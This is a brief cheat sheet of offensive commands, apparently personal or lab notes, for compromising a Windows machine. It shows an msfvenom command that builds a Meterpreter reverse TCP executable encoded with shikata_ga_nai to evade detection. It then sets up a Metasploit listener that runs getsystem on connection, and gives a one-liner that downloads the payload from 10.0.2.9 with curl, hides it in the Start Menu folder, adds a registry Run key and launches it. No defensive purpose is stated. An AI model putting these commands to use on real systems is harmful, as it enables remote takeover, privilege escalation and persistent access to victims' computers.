## Using msfvenom for Reverse TCP Payload (Generate Encoded Payload with Evade Detection)

   ```
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
   ```
   - `-a x86`: 32-bit architecture.
   - `-b "\x00"`: Avoid bad characters.
   - `-e`: Encoder (Shikata Ga Nai).
   - `-i 3`: Encoding iterations.

## Setup Listener (in msfconsole)
Run `msfconsole` with privilege escalation.

 ```
 use exploit/multi/handler
 ```

Setup Listener

 ```
 set payload windows/meterpreter/reverse_tcp
 set LHOST eth0
 set LPORT 9002
 set InitialAutoRunScript "post/windows/escalate/getsystem"
 exploit
 ```

 Waits for victim connection.

## Create Persistence on Victim

```
curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe" http://10.0.2.9:8080/payload.exe && reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Background /t REG_SZ /d "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe""
```
